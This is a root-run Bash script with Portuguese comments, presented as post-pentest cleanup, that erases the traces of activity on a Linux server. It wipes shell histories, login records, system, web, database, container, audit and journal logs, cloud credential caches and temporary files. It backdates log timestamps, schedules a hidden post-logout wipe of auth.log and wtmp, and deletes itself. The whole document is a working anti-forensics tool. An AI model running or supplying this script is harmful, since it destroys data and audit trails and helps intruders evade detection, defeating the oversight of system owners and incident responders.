#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo -e "\e[31m[!] Este script deve ser executado como root!\e[0m"
    exit 1
fi

# Timestamp de referência: 7 dias atrás (usado ao final para normalizar mtimes)
REF_DATE="$(date -d '7 days ago' +%Y%m%d%H%M.%S 2>/dev/null || date -v-7d +%Y%m%d%H%M.%S 2>/dev/null)"

wipe_file() {
    local f="$1"
    if [ -f "$f" ]; then
        echo -e "\e[34m[*] Limpando: $f\e[0m"
        > "$f"
    fi
}

# ─── 1. HISTÓRICO DE SHELL E ARQUIVOS DO USUÁRIO ───────────────────────────
echo -e "\e[32m[+] Limpando rastros de usuários...\e[0m"

for home_dir in /root /home/*; do
    [ -d "$home_dir" ] || continue

    for hist_file in \
        "$home_dir/.bash_history" \
        "$home_dir/.zsh_history" \
        "$home_dir/.sh_history" \
        "$home_dir/.fish_history" \
        "$home_dir/.config/fish/fish_history" \
        "$home_dir/.viminfo" \
        "$home_dir/.nvimlog" \
        "$home_dir/.mysql_history" \
        "$home_dir/.psql_history" \
        "$home_dir/.python_history" \
        "$home_dir/.node_repl_history" \
        "$home_dir/.lesshst" \
        "$home_dir/.wget-hsts" \
        "$home_dir/.ssh/known_hosts" \
        "$home_dir/.ssh/config" \
        "$home_dir/.local/share/recently-used.xbel"
    do
        wipe_file "$hist_file"
    done

    # authorized_keys.bak (backup que pode existir) — keys originais preservadas
    wipe_file "$home_dir/.ssh/authorized_keys.bak"

    # Nvim shada
    [ -f "$home_dir/.local/share/nvim/shada/main.shada" ] && \
        > "$home_dir/.local/share/nvim/shada/main.shada" 2>/dev/null

    # Ferramentas de pentest
    for tool_dir in \
        "$home_dir/.msf4/logs" \
        "$home_dir/.msf4/loot" \
        "$home_dir/.nmap" \
        "$home_dir/.local/share/nmap"
    do
        if [ -d "$tool_dir" ]; then
            echo -e "\e[34m[*] Limpando tool dir: $tool_dir\e[0m"
            find "$tool_dir" -type f -delete 2>/dev/null
        fi
    done

    # Histórico do msfconsole
    wipe_file "$home_dir/.msf4/history"

    # Credenciais cloud (artefatos da sessão de pentest)
    for cloud_dir in \
        "$home_dir/.aws/cli/cache" \
        "$home_dir/.azure" \
        "$home_dir/.config/gcloud/logs" \
        "$home_dir/.config/gcloud/credentials.db"
    do
        if [ -d "$cloud_dir" ]; then
            echo -e "\e[34m[*] Limpando cloud cache: $cloud_dir\e[0m"
            find "$cloud_dir" -type f -delete 2>/dev/null
        elif [ -f "$cloud_dir" ]; then
            wipe_file "$cloud_dir"
        fi
    done

    # Cache do usuário e thumbnails
    rm -rf "$home_dir/.cache/"* 2>/dev/null
    rm -rf "$home_dir/.thumbnails/"* 2>/dev/null
done

# Limpa histórico da sessão atual em memória
unset HISTFILE
history -c 2>/dev/null
export HISTSIZE=0

# ─── 2. REGISTROS DE SESSÃO (who / last / lastb / w) ───────────────────────
echo -e "\e[32m[+] Limpando registros de sessão...\e[0m"

for bin_log in /var/log/wtmp /var/log/btmp /var/run/utmp /var/log/utmp; do
    if [ -f "$bin_log" ]; then
        echo -e "\e[34m[*] Zerando binário: $bin_log\e[0m"
        > "$bin_log"
    fi
done

[ -f /var/log/lastlog ] && { > /var/log/lastlog; echo -e "\e[34m[*] Zerando: /var/log/lastlog\e[0m"; }

# ─── 3. KERNEL RING BUFFER (dmesg) ──────────────────────────────────────────
echo -e "\e[32m[+] Limpando kernel ring buffer...\e[0m"
dmesg -c > /dev/null 2>&1 && echo -e "\e[34m[*] dmesg limpo\e[0m"

# ─── 4. CACHE DE REDE (ARP + DNS) ───────────────────────────────────────────
echo -e "\e[32m[+] Limpando cache de rede...\e[0m"
ip neigh flush all 2>/dev/null && echo -e "\e[34m[*] ARP cache limpo\e[0m"

if command -v systemd-resolve &>/dev/null; then
    systemd-resolve --flush-caches 2>/dev/null && echo -e "\e[34m[*] DNS cache limpo (systemd-resolved)\e[0m"
elif command -v nscd &>/dev/null; then
    nscd -i hosts 2>/dev/null && echo -e "\e[34m[*] DNS cache limpo (nscd)\e[0m"
fi

# ─── 5. LOGS DO SISTEMA ─────────────────────────────────────────────────────
echo -e "\e[32m[+] Limpando logs do sistema...\e[0m"

log_files=(
    "/var/log/auth.log"    "/var/log/secure"         "/var/log/sudo.log"
    "/var/log/syslog"      "/var/log/messages"        "/var/log/kern.log"
    "/var/log/dmesg"       "/var/log/boot.log"        "/var/log/daemon.log"
    "/var/log/user.log"    "/var/log/debug"
    "/var/log/dpkg.log"    "/var/log/apt/history.log" "/var/log/apt/term.log"
    "/var/log/yum.log"     "/var/log/dnf.log"
    "/var/log/cron"        "/var/log/cron.log"
    "/var/log/mail.log"    "/var/log/mail.err"
    "/var/log/ufw.log"     "/var/log/iptables.log"
    "/var/log/apache2/access.log"  "/var/log/apache2/error.log"
    "/var/log/apache2/other_vhosts_access.log"
    "/var/log/nginx/access.log"    "/var/log/nginx/error.log"
    "/var/log/mysql.log"   "/var/log/mysql/error.log" "/var/log/mysql/mysql.log"
    "/var/log/mysql/mysql-slow.log"
    "/var/log/postgresql.log"
    "/var/log/mongodb/mongod.log"
    "/var/log/redis/redis-server.log"
    "/var/log/docker.log"
    "/var/log/cloud-init.log"       "/var/log/cloud-init-output.log"
    "/var/log/waagent.log"
    "/var/log/amazon/ssm/amazon-ssm-agent.log"
    "/var/log/amazon/ssm/errors.log"
    "/var/log/landscape/sysinfo.log"
    "/var/log/tallylog"
    "/var/log/faillog"
)

for file in "${log_files[@]}"; do
    wipe_file "$file"
done

# Sweep geral — pega qualquer log não listado acima
echo -e "\e[32m[+] Sweep geral de /var/log...\e[0m"
find /var/log -type f -name "*.log" ! -name "*.gz" 2>/dev/null | while read -r f; do
    if [ -s "$f" ]; then
        echo -e "\e[34m[*] Sweep: $f\e[0m"
        > "$f"
    fi
done

# ─── 6. LOGS ROTACIONADOS ───────────────────────────────────────────────────
echo -e "\e[32m[+] Removendo logs rotacionados...\e[0m"
find /var/log -type f \( -name "*.log.*" -o -name "*.gz" -o -name "*.1" -o -name "*.old" \) \
    2>/dev/null -exec rm -f {} \;

# ─── 7. AUDITD ──────────────────────────────────────────────────────────────
if [ -d /var/log/audit ]; then
    echo -e "\e[32m[+] Limpando audit logs...\e[0m"
    systemctl stop auditd 2>/dev/null || service auditd stop 2>/dev/null
    > /var/log/audit/audit.log
    find /var/log/audit -type f -name "audit.log.*" -delete 2>/dev/null
    systemctl start auditd 2>/dev/null || service auditd start 2>/dev/null
fi

# ─── 8. JOURNAL SYSTEMD ─────────────────────────────────────────────────────
if command -v journalctl &>/dev/null; then
    echo -e "\e[32m[+] Limpando journal systemd...\e[0m"
    journalctl --flush --rotate 2>/dev/null
    journalctl --vacuum-time=1s 2>/dev/null
    find /var/log/journal -type f -delete 2>/dev/null
fi

# ─── 9. LOGS DE CONTAINERS ──────────────────────────────────────────────────
for log_dir in /var/log/containers /var/log/pods; do
    if [ -d "$log_dir" ]; then
        echo -e "\e[32m[+] Limpando container logs: $log_dir...\e[0m"
        find "$log_dir" -type f -name "*.log" -exec sh -c '> "$1"' _ {} \;
    fi
done

# Docker container logs (JSON)
if [ -d /var/lib/docker/containers ]; then
    find /var/lib/docker/containers -type f -name "*-json.log" 2>/dev/null | while read -r f; do
        echo -e "\e[34m[*] Zerando docker log: $f\e[0m"
        > "$f"
    done
fi

# ─── 10. LOGS WEB — SUBDIRETÓRIOS COMPLETOS ─────────────────────────────────
for web_log_dir in /var/log/apache2 /var/log/nginx /var/log/httpd; do
    if [ -d "$web_log_dir" ]; then
        echo -e "\e[32m[+] Sweep web logs: $web_log_dir...\e[0m"
        find "$web_log_dir" -type f \( -name "*.log" -o -name "*.log.*" -o -name "*.gz" \) \
            -exec sh -c '> "$1" 2>/dev/null || rm -f "$1"' _ {} \;
    fi
done

# ─── 11. CORE DUMPS ─────────────────────────────────────────────────────────
echo -e "\e[32m[+] Limpando core dumps...\e[0m"
find /var/lib/systemd/coredump -type f -delete 2>/dev/null
find /var/crash -type f -delete 2>/dev/null
find / -maxdepth 3 -name "core" -o -name "core.[0-9]*" 2>/dev/null | xargs rm -f 2>/dev/null

# ─── 12. ACCOUNTSSERVICE (login history do GDM/lightdm) ────────────────────
if [ -d /var/lib/AccountsService/users ]; then
    echo -e "\e[32m[+] Limpando AccountsService...\e[0m"
    find /var/lib/AccountsService/users -type f -delete 2>/dev/null
fi

# ─── 13. CACHE E TEMPORÁRIOS ────────────────────────────────────────────────
echo -e "\e[32m[+] Limpando caches e temporários...\e[0m"
rm -rf /var/cache/apt/archives/*.deb 2>/dev/null
rm -rf /var/cache/yum 2>/dev/null
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null
rm -rf /dev/shm/* 2>/dev/null

# ─── 14. OUTPUTS DE FERRAMENTAS EM /root E /tmp ─────────────────────────────
echo -e "\e[32m[+] Limpando outputs de ferramentas...\e[0m"
find /root /tmp /var/tmp -maxdepth 2 -type f \
    \( -name "*.xml" -o -name "*.gnmap" -o -name "*.nmap" \
    -o -name "*.rc" -o -name "*.txt" -o -name "*.out" \
    -o -name "*.pcap" -o -name "*.cap" \) \
    2>/dev/null -exec rm -f {} \;

# ─── 15. AVISOS MANUAIS (ações que o script não faz automaticamente) ────────
echo -e "\e[33m"
echo "[!] AVISOS — verificar manualmente:"
echo "    • /etc/hosts        — remover entradas adicionadas durante o pentest"
echo "    • /etc/passwd       — confirmar que nenhum usuário foi criado"
echo "    • /var/spool/cron/  — confirmar que nenhum cron job foi adicionado"
echo "    • /var/spool/at/    — confirmar que nenhum 'at' job está agendado"
echo "    • iptables/nftables — confirmar que regras de redirecionamento foram removidas"
echo "    • Logs remotos (rsyslog/syslog-ng) — não podem ser apagados localmente"
echo -e "\e[0m"

# ─── 16. NORMALIZAR TIMESTAMPS DOS LOGS ─────────────────────────────────────
# mtime/atime dos arquivos de log são ajustados para 7 dias atrás.
# NOTA: ctime não pode ser alterado via userspace — limitação do kernel.
if [ -n "$REF_DATE" ]; then
    echo -e "\e[32m[+] Normalizando timestamps de /var/log...\e[0m"
    find /var/log -type f 2>/dev/null | xargs -I{} touch -t "$REF_DATE" {} 2>/dev/null
fi

echo -e "\e[33m\n[!] Limpeza concluída.\n\e[0m"

# ─── 17. PÓS-LOGOUT — zera auth.log/wtmp após sshd registrar a saída ────────
# O sshd escreve o evento de logout DEPOIS que o shell encerra.
# Este processo fica em background e zera os arquivos após o desconect.
echo -e "\e[32m[+] Agendando limpeza pós-logout (10s)...\e[0m"
(
    sleep 10
    > /var/log/auth.log
    > /var/log/wtmp
    > /var/log/btmp
    > /var/log/secure 2>/dev/null
    # Journal pode ter registrado o logout também
    journalctl --flush --rotate > /dev/null 2>&1
    journalctl --vacuum-time=1s > /dev/null 2>&1
) &
disown

echo -e "\e[33m[!] Deslogue agora. Limpeza final em 10 segundos.\e[0m"

# Auto-delete do próprio script
rm -f "$0"
